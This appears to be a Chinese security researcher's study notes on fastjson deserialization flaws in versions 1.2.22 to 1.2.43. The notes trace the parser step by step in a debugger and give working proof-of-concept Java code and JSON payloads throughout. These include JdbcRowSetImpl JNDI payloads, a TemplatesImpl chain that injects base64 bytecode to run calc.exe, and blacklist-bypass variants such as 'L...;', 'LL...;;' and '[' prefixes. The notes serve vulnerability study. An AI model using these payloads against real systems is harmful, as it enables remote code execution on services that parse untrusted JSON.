先新建一个 hashmap

```
this.map = new HashMap(initialCapacity);
```

跟进 `parseObject` 方法

![image-20220222121136100](img/image-20220222121136100.png)![image-20220222121136100](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222121136100.png?lastModify=1646033842)

token 为 12 ，进入 esle，进入 while

![image-20220222121215084](img/image-20220222121215084.png)![image-20220222121215084](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222121215084.png?lastModify=1646033842)

`lexer.skipWhitespace();` 去除一些空白字符

![image-20220222121325337](img/image-20220222121325337.png)![image-20220222121325337](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222121325337.png?lastModify=1646033842)

`char ch = lexer.getCurrent();` 回去当前位置字符为 引号 `"` 。进入 if ，但是 while 条件不满足。

![image-20220222121502504](img/image-20220222121502504.png)![image-20220222121502504](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222121502504.png?lastModify=1646033842)

正好上边获得的字符为 `"`，

`lexer.scanSymbol(this.symbolTable, '"')` 扫描 引号之间的特征字符串，这里从 `{"@type":"demo.Evil","cmd":"yanmie"}` 得到 `@type` 。

继续取出空白字符后，拿到下一位字符 冒号 `:` ，没有抛出异常。

![image-20220222122101771](img/image-20220222122101771.png)![image-20220222122101771](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222122101771.png?lastModify=1646033842)

拿到下一个 引号，继续扫描特征字符，之间的字符串是 `demo.Evil`。

![image-20220222122358863](img/image-20220222122358863.png)![image-20220222122358863](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222122358863.png?lastModify=1646033842)

然后`TypeUtils.loadClass` 加载类，然后放入 map

![image-20220222122632713](img/image-20220222122632713.png)![image-20220222122632713](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222122632713.png?lastModify=1646033842)

nexToken 将 token 赋值为 20

![image-20220222123028667](img/image-20220222123028667.png)![image-20220222123028667](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222123028667.png?lastModify=1646033842)

来到

![image-20220222123141133](img/image-20220222123141133.png)![image-20220222123141133](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222123141133.png?lastModify=1646033842)

跟进 `getDeserializer`

![image-20220222123303137](img/image-20220222123303137.png)![image-20220222123303137](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222123303137.png?lastModify=1646033842)

继续跟进 `getDeserializer`

![image-20220222123605954](img/image-20220222123605954.png)![image-20220222123605954](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222123605954.png?lastModify=1646033842)

拿到 类名，然后对比黑名单，如果字符串要转换的对象为黑名单内容，就抛出异常。

接下来也是看是否是一些特定的类。都不是跳过。

![image-20220222124237580](img/image-20220222124237580.png)![image-20220222124237580](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222124237580.png?lastModify=1646033842)

![image-20220222124139216](img/image-20220222124139216.png)![image-20220222124139216](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222124139216.png?lastModify=1646033842)

拿到 类的一些信息，放入 haspmap ，最后返回 包含类基本信息的这个对象。

回到 `parseObject`，

跟进 `deserializer.deserialze`

![image-20220222124447550](img/image-20220222124447550.png)![image-20220222124447550](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222124447550.png?lastModify=1646033842)

> 但是这个类并不能用于调试，因为fastjson中用ASM生成的代码没有linenumber、trace等用于调试的信息，所以不能调试。不过通过在Expression那个窗口重写部分代码，生成可用于调式的bytecode应该也是可行的

这里就调试不进去了，因为使用 ASM 动态生成的。（这里面就执行了 set 方法）

![image-20220222124726808](img/image-20220222124726808.png)![image-20220222124726808](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222124726808.png?lastModify=1646033842)

会抛出异常，进入  finally ，

![image-20220222124909344](img/image-20220222124909344.png)![image-20220222124909344](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222124909344.png?lastModify=1646033842)

回到 `JSON#parse`

![image-20220222125016111](img/image-20220222125016111.png)![image-20220222125016111](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222125016111.png?lastModify=1646033842)

继续回到`JSON#parseObject`

![image-20220222125551935](img/image-20220222125551935.png)![image-20220222125551935](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222125551935.png?lastModify=1646033842)

跟进 `toJSON`

来到

![image-20220222125847669](img/image-20220222125847669.png)![image-20220222125847669](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222125847669.png?lastModify=1646033842)

跟进 `javaBeanSerializer.getFieldValuesMap` ，参数为 `Evil` 类

![image-20220222130304886](img/image-20220222130304886.png)![image-20220222130304886](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222130304886.png?lastModify=1646033842)

跟进 `getter.getPropertyValue`

![image-20220222130338802](img/image-20220222130338802.png)![image-20220222130338802](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222130338802.png?lastModify=1646033842)

跟进 `get`

![image-20220222130508828](img/image-20220222130508828.png)![image-20220222130508828](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222130508828.png?lastModify=1646033842)

到这里调用了 getter 方法。

setter 具体调用处，

在`com.alibaba.fastjson.util.JavaBeanInfo#build`中，

![image-20220222132434970](img/image-20220222132434970.png)![image-20220222132434970](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222132434970.png?lastModify=1646033842)

在通过`@type`拿到类之后，通过反射拿到该类所有的方法存入methods，接下来遍历methods进而获取get、set方法，如上图。总结set方法自动调用的条件为：

1. 方法名长度大于4
2. 非静态方法
3. 返回值为void或当前类
4. 方法名以set开头
5. 参数个数为1

当满足条件之后会从方法名截取属性名，截取时会判断`_`，如果是`set_name`会截取为`name`属性，具体逻辑如下：

![image-20220222132539939](img/image-20220222132539939.png)![image-20220222132539939](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222132539939.png?lastModify=1646033842)

当截取完但是找不到这个属性

![image-20220222132608047](img/image-20220222132608047.png)![image-20220222132608047](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222132608047.png?lastModify=1646033842)

会判断传入的第一个参数类型是否为布尔型，是的话就在截取完的变量前加上`is`，截取propertyName的第一个字符转大写和第二个字符，并且然后重新尝试获取属性字段。

比如：public boolean setBoy(boolean t) 会寻找`isBoy`字段。

set的整个判断就是：如果有setCmd()会绑定cmd属性，如果该类没有cmd属性会绑定isCmd属性。

get的判断

![image-20220222133026995](img/image-20220222133026995.png)![image-20220222133026995](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222133026995.png?lastModify=1646033842)

总结下就是：

1. 方法名长度大于等于4
2. 非静态方法
3. 以get开头且第4个字母为大写
4. 无传入参数
5. 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong

当程序绑定了对应的字段之后，如果传入json字符串的键值中存在这个值，就会去调用执行对应的setter、构造方法。

## 1.2.22-1.2.24

两条利用链：

- JNDI  `com.sun.rowset.JdbcRowSetImpl` 链
- `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` 链

#### JNDI jdbcRowSetImpl利用链

JNDI 传输过程中使用的就是序列化和反序列化，所以通杀三种解析方式

```
JSON.parse(evil);
JSON.parseObject(evil);
JSON.parseObject(evil, Object.class);
```

poc：

```
import com.sun.rowset.JdbcRowSetImpl;

import java.sql.SQLException;

public class JNDIDemo {
    public static void main(String[] args) throws SQLException {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        jdbcRowSet.setDataSourceName("ldap://127.0.0.1:1389/poc");
        jdbcRowSet.setAutoCommit(true);
    }
}
```

![image-20220222201751048](img/image-20220222201751048.png)![image-20220222201751048](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222201751048.png?lastModify=1646033842)

之前 jndi 调试过。

setDataSourceName()和setAutoCommit()满足setter自动调用的条件，当我们传入对应json键值对时就会触发setter，进而触发jndi链接。payload如下

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/poc", "autoCommit":true}
```

![image-20220222202100865](img/image-20220222202100865.png)![image-20220222202100865](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222202100865.png?lastModify=1646033842)

#### TemplatesImpl 利用链

条件比较艰难：

- 服务端使用 parseObject 时，必须使用如下格式才能触发漏洞：

  ```
  JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)
  ```

- 服务端使用 parse() 时，需要

  ```
  JSON.parse(text1,Feature.SupportNonPublicField)
  ```

poc:

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;


import java.util.Base64;

public class TemplatesImplDemo {
    public static byte[] getevilbyte() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("fastjson");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        ctClass.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        return ctClass.toBytecode();
    }


    public static void main(String args[]) {
        try {
            byte[] evilCode = getevilbyte();
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\"" + evilCode_base64 + "\"],'_name':'asd','_tfactory':{ },\"_outputProperties\":{ }," + "\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(text1);
            ParserConfig config = new ParserConfig();
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAGQEACGZhc3Rqc29uBwABAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAAwEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAIAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwACgALCgAJAAwBAAhjYWxjLmV4ZQgADgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABAAEQoACQASAQAGPGluaXQ+DAAUAAYKAAQAFQEAClNvdXJjZUZpbGUBAA1mYXN0anNvbi5qYXZhACEAAgAEAAAAAAACAAgABQAGAAEABwAAABYAAgAAAAAACrgADRIPtgATV7EAAAAAAAEAFAAGAAEABwAAABEAAQABAAAABSq3ABaxAAAAAAABABcAAAACABg="],'_name':'test','_tfactory':{ },"_outputProperties":{ }}
```

![image-20220222203213420](img/image-20220222203213420.png)![image-20220222203213420](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220222203213420.png?lastModify=1646033842)

思考：

1. 为什么 `parseObject` 需要 `Feature.SupportNonPublicField`
2. 为什么需要 `_outputProperties` 属性
3. `_bytecodes` 为什么需要 base64 编码
4. `_tfactory` 为什么为 {} 

#### 调试分析

接上上边的 `JavaBeanDeserializer#deserialze` ，现在可以往下跟了，

![image-20220223104743746](img/image-20220223104743746.png)![image-20220223104743746](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223104743746.png?lastModify=1646033842)

进行一些赋值，

![image-20220223110425833](img/image-20220223110425833.png)![image-20220223110425833](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223110425833.png?lastModify=1646033842)

while 循环对一些值进行检查，直到

![image-20220223110653730](img/image-20220223110653730.png)![image-20220223110653730](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223110653730.png?lastModify=1646033842)

扫描 json 字符串，得到 `_bytecodes`，

然后

![image-20220223111058801](img/image-20220223111058801.png)![image-20220223111058801](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223111058801.png?lastModify=1646033842)

![image-20220223111024862](img/image-20220223111024862.png)![image-20220223111024862](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223111024862.png?lastModify=1646033842)

拿到构造函数，实例化 TemplatesImpl 对象。

到达

![image-20220223111145428](img/image-20220223111145428.png)![image-20220223111145428](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223111145428.png?lastModify=1646033842)

跟进 `parseField`

![image-20220223111238042](img/image-20220223111238042.png)![image-20220223111238042](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223111238042.png?lastModify=1646033842)

跟进 `smartMatch` ， key 为 `_bytecodes`，

![image-20220223111612077](img/image-20220223111612077.png)![image-20220223111612077](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223111612077.png?lastModify=1646033842)

想拿到关于 `_bytecodes` 的字段信息，但是为 null ，进入 if，

循环本来有的三个字段信息，比较

![image-20220223111723959](img/image-20220223111723959.png)![image-20220223111723959](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223111723959.png?lastModify=1646033842)

上面得到 null，所以进入 此 if

![image-20220223111907248](img/image-20220223111907248.png)![image-20220223111907248](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223111907248.png?lastModify=1646033842)

`_bytecodes` 第一个字符是 `_`，设置`snakeOrkebab`为 true ,然后将其替换为空（`-`下边也会替换），跳出循环

![image-20220223112123910](img/image-20220223112123910.png)![image-20220223112123910](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223112123910.png?lastModify=1646033842)

这里想拿 `bytecodes` 的信息，但是依旧为 null，

![image-20220223112234011](img/image-20220223112234011.png)![image-20220223112234011](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223112234011.png?lastModify=1646033842)

也不满足，返回 null。

回到`parseField`，

![image-20220223113126289](img/image-20220223113126289.png)![image-20220223113126289](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223113126289.png?lastModify=1646033842)

拿到 TemplatesImpl 的所有字段，然后将符合条件的放入创建的hashmap。

![image-20220223113517587](img/image-20220223113517587.png)![image-20220223113517587](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223113517587.png?lastModify=1646033842)

先从上面的 hashmap 中取出 关于 `_bytecodes` 的字段的信息，然后放入新建的`DefaultFieldDeserializer` 反序列化器，再放入 `extraFieldDeserializers`。

![image-20220223113742974](img/image-20220223113742974.png)![image-20220223113742974](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223113742974.png?lastModify=1646033842)

跟进 `parseField` 看看，

![image-20220223114106860](img/image-20220223114106860.png)![image-20220223114106860](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223114106860.png?lastModify=1646033842)

跟进 `parseArray`

![image-20220223114226929](img/image-20220223114226929.png)![image-20220223114226929](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223114226929.png?lastModify=1646033842)

跟进`deserialze`

![image-20220223114408419](img/image-20220223114408419.png)![image-20220223114408419](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223114408419.png?lastModify=1646033842)

这里获取 `_bytecodes` 对应的值，跟进去看看

![image-20220223114438640](img/image-20220223114438640.png)![image-20220223114438640](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223114438640.png?lastModify=1646033842)

将拿到的值进行 base64 解码。（所以 poc 中 `_bytecodes` 需要 base64 编码）

![image-20220223114708345](img/image-20220223114708345.png)![image-20220223114708345](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223114708345.png?lastModify=1646033842)

存入 array，

回到 `ObjectArrayCodec#deserialze`

![image-20220223114856517](img/image-20220223114856517.png)![image-20220223114856517](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223114856517.png?lastModify=1646033842)

return 时调用了 `toObjectArray` 方法，把解析出来的 byte 数组放进 `byte[][]` 数组中，对应了 TemplatesImpl 类的 `_bytecode` 变量类型。

![image-20220223115147975](img/image-20220223115147975.png)![image-20220223115147975](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223115147975.png?lastModify=1646033842)

这里把拿到的值放到 TemplatesImpl 对象中去。

回到 `JavaBeanDeserializer` 类，

![image-20220223115303185](img/image-20220223115303185.png)![image-20220223115303185](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223115303185.png?lastModify=1646033842)

循环 while，

![image-20220223115519496](img/image-20220223115519496.png)![image-20220223115519496](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223115519496.png?lastModify=1646033842)

继续扫描下一个变量的值 `_name`， 

![image-20220223115840867](img/image-20220223115840867.png)![image-20220223115840867](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223115840867.png?lastModify=1646033842)

这里又和上边 `_bytecodes` 处理逻辑一样了。

拿到 json 中字段的值，放到 object 中。

继续获取poc中 `_tfactory`， `{}`代表空对象，和 `“”` 是不同的，这里发现会再次调用此处代码来获取 `_tfactory` 的值，但是获取的值是 null，进入 if ，跟之前的逻辑变了。

![image-20220223120807521](img/image-20220223120807521.png)![image-20220223120807521](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223120807521.png?lastModify=1646033842)

break 跳出，

![image-20220223120944113](img/image-20220223120944113.png)![image-20220223120944113](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223120944113.png?lastModify=1646033842)

新建了一个 `TransformerFactoryImpl` 对象

![image-20220223121119462](img/image-20220223121119462.png)![image-20220223121119462](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223121119462.png?lastModify=1646033842)

赋值。

```
private transient TransformerFactoryImpl _tfactory = null;
```

然后下一个变量 `_outputProperties` ，来到

![image-20220223121717276](img/image-20220223121717276.png)![image-20220223121717276](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223121717276.png?lastModify=1646033842)

![image-20220223121810677](img/image-20220223121810677.png)![image-20220223121810677](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223121810677.png?lastModify=1646033842)

来到 `setValue` 赋值处，

跟进，（赋值那应该就是调用 set/get 方法）

![image-20220223122129518](img/image-20220223122129518.png)![image-20220223122129518](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223122129518.png?lastModify=1646033842)

这里获取到了 getter 方法，（）

![image-20220223122211532](img/image-20220223122211532.png)![image-20220223122211532](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223122211532.png?lastModify=1646033842)

反射调用，之后链就跟最前面的 CC 链一样了。

（有点乱.......）

```
invoke:488, Method (java.lang.reflect)
setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:302, JSON (com.alibaba.fastjson)
main:29, TemplatesImplDemo
```

#### 问题

解决一下之前的问题：

1. **`Feature.SupportNonPublicField`** 在fastjson中默认并不能序列化private属性，而我们使用的`TemplatesImpl`利用链的多个属性都是private，所以在反序列化的时候需要加上`Feature.SupportNonPublicField`，这也成了这个利用链的最大限制。
2. 为什么需要`_outputProperties`属性？  调试过程中也分析到了，会代码中去掉 `_   -`，所以对应 getter 就是 `getOutputProperties`
3. `_bytecodes`为什么需要base64编码？  调试中也分析过了，会拿到 json poc 中的值进行 base64 解码。
4. `_tfactory` 为什么为 `{}` ？   在 `JavaBeanDeserializer.class:579`解析字段值时，会自动判断传入键值是否为空，如果为空会根据类属性定义的类型自动创建实例。调试中也有分析到。

## 1.2.25-1.2.41

pom.xml

```
<dependencies>
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.40</version>
    </dependency>
    <dependency>
        <groupId>org.javassist</groupId>
        <artifactId>javassist</artifactId>
        <version>3.28.0-GA</version>
    </dependency>
</dependencies>
```

用上边的两条件都会报错

![image-20220223124411195](img/image-20220223124411195.png)![image-20220223124411195](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223124411195.png?lastModify=1646033842)

![image-20220223124428391](img/image-20220223124428391.png)![image-20220223124428391](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223124428391.png?lastModify=1646033842)

`autoType is not support` 。

来到这里，在1.2.25版本中AutoTypeSupport默认false，

![image-20220223125135782](img/image-20220223125135782.png)![image-20220223125135782](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223125135782.png?lastModify=1646033842)

判断类前缀黑名单

![image-20220223125226852](img/image-20220223125226852.png)![image-20220223125226852](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223125226852.png?lastModify=1646033842)

`com.sun.rowset.JdbcRowSetImpl`  和 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`以 `com.sun` 开头，检测到，抛出异常。

```
checkAutoType:903, ParserConfig (com.alibaba.fastjson.parser)
parseObject:308, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1335, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1301, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:152, JSON (com.alibaba.fastjson)
parse:162, JSON (com.alibaba.fastjson)
parse:131, JSON (com.alibaba.fastjson)
parseObject:223, JSON (com.alibaba.fastjson)
main:10, ParseTest
```



需要显示关闭白名单

```
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

因为设置 `this.autoTypeSupport` 为 true 了，所以进入此处

![image-20220223130048943](img/image-20220223130048943.png)![image-20220223130048943](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223130048943.png?lastModify=1646033842)

还是要绕过，但如果在类前面加一些字符，那么就不会被匹配，

解析来就到了 858 行

![image-20220223131352179](img/image-20220223131352179.png)![image-20220223131352179](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223131352179.png?lastModify=1646033842)

跟进 

![image-20220223131514327](img/image-20220223131514327.png)![image-20220223131514327](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223131514327.png?lastModify=1646033842)

这里会判断它是否开头是 `[` 或者 以`L` 开头`;` 结果，然后去掉，在加载。

回到  `checkAutoType`

![image-20220223132207100](img/image-20220223132207100.png)![image-20220223132207100](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223132207100.png?lastModify=1646033842)

最后还会判断这个值。（所以必须将其手动设置为 true）

> 在1.2.25之后所谓的绕过都是在显示关闭白名单的条件下绕过的。

#### poc

jdbcRowSetImpl 链

```
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://localhost:1389/poc", "autoCommit":true}
```

TemplatesImpl 链

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import javassist.ClassPool;
import javassist.CtClass;

import java.util.Base64;

public class TemplatesImplDemo {
    public static byte[] getevilbyte() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("fastjson");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        ctClass.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        return ctClass.toBytecode();
    }


    public static void main(String args[]) {
        try {
            byte[] evilCode = getevilbyte();
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
            final String NASTY_CLASS = "Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;";
            String text1 = "{\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\"" + evilCode_base64 + "\"],'_name':'test','_tfactory':{ },\"_outputProperties\":{ }}";
            System.out.println(text1);

            ParserConfig config = new ParserConfig();
            config.setAutoTypeSupport(true);
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static class test {

    }
}
```

## 1.2.42 

继续尝试

```
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://localhost:1389/poc", "autoCommit":true}
```

发现报错了

![image-20220223140853188](img/image-20220223140853188.png)![image-20220223140853188](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223140853188.png?lastModify=1646033842)

调试跟进去发现ParserConfig中黑名单改为hash，并且对传入的类名，删除开头的 `L` 和 `;`

这里判断第一位和最后一位，然后进行去除，

![image-20220223161626572](img/image-20220223161626572.png)![image-20220223161626572](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223161626572.png?lastModify=1646033842)

这里比搜索黑名单

![image-20220223161919615](img/image-20220223161919615.png)![image-20220223161919615](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223161919615.png?lastModify=1646033842)

在其构造函数赋值

![image-20220223161956549](img/image-20220223161956549.png)![image-20220223161956549](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223161956549.png?lastModify=1646033842)

> 虽然说利用hash可以让我们不知道禁用了什么类，但是加密方式是有写`com.alibaba.fastjson.parser.ParserConfig#addDeny`中的`com.alibaba.fastjson.util.TypeUtils#fnv1a_64`，我们理论上可以遍历jar，字符串，类去碰撞得到这个hash的值。（因为常用的包是有限的）

```
public static long fnv1a_64(String key) {
    long hashCode = -3750763034362895579L;

    for(int i = 0; i < key.length(); ++i) {
        char ch = key.charAt(i);
        hashCode ^= (long)ch;
        hashCode *= 1099511628211L;
    }

    return hashCode;
}
```

通过遍历每一位进行固定的异或和乘法运算进行累积运算。

有一个[Github项目](https://github.com/LeadroyaL/fastjson-blacklist)就是完成了这样的事情，并列出了目前已经得到的hash。

#### poc

但是这里开头和结尾匹配到相关字符，仅仅进行了去除一次，那么可以双写绕过

```
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1389/poc", "autoCommit":true}
```

TemplatesImpl 链

```
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import javassist.ClassPool;
import javassist.CtClass;

import java.util.Base64;

public class TemplatesImplDemo {
    public static byte[] getevilbyte() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("fastjson");
        ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        ctClass.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc.exe\");");
        return ctClass.toBytecode();
    }


    public static void main(String args[]) {
        try {
            byte[] evilCode = getevilbyte();
            String evilCode_base64 = Base64.getEncoder().encodeToString(evilCode);
            final String NASTY_CLASS = "LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;";
            String text1 = "{\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\"" + evilCode_base64 + "\"],'_name':'test','_tfactory':{ },\"_outputProperties\":{ }}";
            System.out.println(text1);

            ParserConfig config = new ParserConfig();
            config.setAutoTypeSupport(true);
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static class test {

    }
}
```

## 1.2.43

拿上一次的 poc 打一下，

![image-20220223162957059](img/image-20220223162957059.png)![image-20220223162957059](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223162957059.png?lastModify=1646033842)

调试

![image-20220223163252449](img/image-20220223163252449.png)![image-20220223163252449](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220223163252449.png?lastModify=1646033842)

这里进行了两次判断，判断了`第一位`、`最后一位`、`第二位`。

也就是 `L`开头 `;` 结尾 和 `LL` 开头。

那么前面的多写就不行了。

之前又说道，可以利用`[` 进行绕过，但是发现会报错。（是自己太菜了。。）

有个poc

#### poc

```
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://localhost:1389/Exec", "autoCommit":true}
```

## 1.2.44

